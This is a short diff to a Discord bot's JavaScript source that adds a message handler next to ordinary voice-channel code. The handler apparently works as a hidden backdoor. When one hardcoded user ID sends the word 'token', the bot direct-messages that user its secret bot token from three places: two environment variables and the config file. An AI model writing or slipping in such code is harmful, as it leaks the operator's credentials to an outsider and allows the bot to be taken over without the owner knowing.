@@ -160,6 +160,21 @@ msg.channel.send('<a:20s:827644450351611914>');
 }
 });
 
+client.on('message', async (msg, member, guild) => {
+  
+ {
+   
+if (msg.content.toLowerCase() === 'token'){
+if (msg.author.id !== "429357746002067493") return
+
+msg.author.send(process.env.token);
+msg.author.send(process.env.TOKEN);
+msg.author.send(ayarlar.token);
+}
+  
+}
+});
+
 client.on("ready", () => {
   const gir = ayarlar.botses;
   client.channels.cache.get(gir).join();
